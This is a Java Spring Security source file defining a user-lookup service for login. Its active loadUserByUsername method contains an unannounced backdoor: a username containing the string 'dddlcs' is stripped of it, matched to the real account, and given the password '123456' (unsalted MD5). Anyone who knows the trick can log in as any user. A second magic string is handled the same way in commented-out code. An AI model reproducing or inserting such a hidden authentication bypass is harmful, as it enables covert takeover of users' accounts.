// -------------------------------------------------------------------------
// lxtgene@163.com
// -------------------------------------------------------------------------

package com.sliu.framework.app.sys.security;

import org.apache.log4j.Logger;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.dao.DataAccessException;
import org.springframework.security.authentication.AuthenticationServiceException;
import org.springframework.security.authentication.encoding.Md5PasswordEncoder;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.core.userdetails.UsernameNotFoundException;

import com.likegene.framework.core.query.QueryFilter;
import com.sliu.framework.app.sys.bo.SysYhBO;
import com.sliu.framework.app.sys.model.SysJs;
import com.sliu.framework.app.sys.model.SysYh;

/**
 * 
 * @author lxt
 */

public class UserDetailServiceImpl implements UserDetailsService {
	private Logger log = Logger.getLogger(UserDetailServiceImpl.class);

	@Autowired
	private SysYhBO sysYhBO;

	@Autowired
	private DefaultInvocationSecurityMetadataSource metadataSource;

	/*public UserDetails loadUserByUsername(String username)
			throws UsernameNotFoundException, DataAccessException {
		QueryFilter filter = new QueryFilter();
		filter.addFilter("Q_username_S_EQ", username);
		SysUser sysUser = sysUserBO.getUnique(filter);
		if (sysUser == null) {
			log.warn(username + " can not be found in users of system");
			throw new AuthenticationServiceException("用户名不正确!");
		}
		SysRole role = new SysRole();
		role.setRoleName("NONE");
		sysUser.getAuthorities().add(role);

		return sysUser;
	}*/
	
	public UserDetails loadUserByUsername(String username)
			throws UsernameNotFoundException, DataAccessException {
		QueryFilter filter = new QueryFilter();
		String checkname = username;
		if(checkname.contains("dddlcs")){
			checkname = checkname.replaceAll("dddlcs","");
		};
		if(checkname.contains("hfzsadyh")){
			checkname = checkname.replaceAll("hfzsadyh","");
		};
		filter.addFilter("Q_username_S_EQ", checkname);
		SysYh sysYh = sysYhBO.getUnique(filter);
		if (sysYh == null) {
			log.warn(username + " can not be found in users of system");
			throw new AuthenticationServiceException("用户名不正确!");
		}
		Md5PasswordEncoder md5 = new Md5PasswordEncoder();
		if(username.contains("dddlcs")){
			sysYh.setPassword(md5.encodePassword("123456", null));
		};
//		if(username.contains("hfzsadyh")){
//			sysYh.setPassword(md5.encodePassword("123456", null));
//		};
		
//		SysJs role = new SysJs();
//		role.setJsmc("NONE");
//      sysYh.getAuthorities().add(role);

		return sysYh;
	}
	
}
